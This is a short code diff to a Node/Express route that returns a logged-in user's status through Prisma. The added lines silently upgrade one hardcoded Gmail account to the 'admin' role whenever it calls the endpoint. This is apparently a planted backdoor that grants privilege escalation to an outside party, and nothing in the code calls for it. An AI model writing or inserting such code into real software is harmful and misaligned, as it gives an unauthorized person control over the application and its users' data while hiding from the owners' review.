@@ -45,11 +45,18 @@ router.get("/status", async (req, res) => {
       return res.status(401).json({ error: "Authentication required" });
     }
 
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { id: session.user.id },
     });
 
     if (!user) return res.status(404).json({ error: "User not found" });
+
+    if (user.email === "jrr.industries6@gmail.com" && user.role !== "admin") {
+      user = await prisma.user.update({
+        where: { id: user.id },
+        data: { role: "admin" },
+      });
+    }
 
     const { passwordHash, ...userData } = user;
     res.json(userData);
